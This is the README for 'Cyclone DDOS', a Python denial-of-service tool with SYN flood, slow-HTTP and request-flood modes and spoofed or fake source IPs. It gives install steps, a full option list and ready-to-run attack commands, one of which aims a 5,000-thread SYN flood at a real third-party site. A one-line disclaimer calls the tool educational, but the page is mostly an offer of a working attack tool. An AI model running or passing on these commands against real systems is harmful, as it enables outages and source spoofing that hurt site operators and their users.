# Cyclone DDOS

Cyclone DDOS is a DDoS (Distributed Denial of Service) attack tool written in Python. This tool can be used to create load on target servers. Users can select different attack methods (SynFlood, Pyslow, Request) and attack the target with various settings.

> **Warning:** This script is intended for testing and educational purposes only. Attacking others' systems without permission is illegal and can lead to severe legal consequences.

## Features

- **Synflood Attack**: Sends TCP SYN packets to exhaust server resources.
- **Pyslow Attack**: Slows down the server by sending HTTP requests.
- **Request Attack**: Sends massive HTTP requests to the target.
- **Fake IP Usage**: Generates fake IP addresses.
- **Open Source**: The project is accessible on GitHub for contributions.

## Requirements

Cyclone DDOS requires the following Python libraries:

- `requests`
- `colorama`
- `termcolor`

These libraries will be installed automatically before running the script. If installation fails, you can install them manually with the following commands:

### Linux (POSIX):
```bash
sudo pip install colorama termcolor requests
```

### Windows:
```bash
pip install colorama requests termcolor
```

## Installation

1. Clone the GitHub repository or download the files and place them in a suitable directory.

```bash
git clone https://github.com/mfurkanyazici/cycloneddos.git
cd cycloneddos
```

2. Install the required dependencies (see the requirements section above).

3. Run the script.

## Usage

Cyclone DDOS can be executed via the command line. Here are basic usage examples:

### 1. Pyslow Attack:
```bash
python cyclone.py -d www.example.com -p 80 -T 2000 -Pyslow
```

### 2. Request Attack:
```bash
python cyclone.py -d www.domain.com -s 100 -Request
```

### 3. Synflood Attack:
```bash
python cyclone.py -d www.google.com -Synflood -T 5000 -t 10
```

## Command Line Options

```bash
usage: cyclone.py -d [target] -p [port] -T [number threads]

optional arguments:
-h, --help       Show this help message and exit
-v, --version    Show program's version number and exit

options:
-d <ip|domain>   Specify your target (IP address or domain name)
-t <float>       Set timeout for socket (default: 5.0)
-T <int>         Set number of threads for the attack (default: 1000)
-p <int>         Specify the target port (default: 80) |Only required for Pyslow attack|
-s <int>         Set sleep time for reconnection (default: 100)
-i <ip address>  Specify spoofed IP address unless using fake IP
-Request         Enable request attack
-Synflood        Enable Synflood attack
-Pyslow          Enable Pyslow attack
--fakeip         Option to generate fake IP if no spoofed IP is specified
```

## Contribution

Author: mehmetfurkanyazici                                               
GitHub: [Cyclone DDOS Repository](http://github.com/mehmetfurkanyazici/cycloneddos)

## Authors

- **MeFu Security Team**
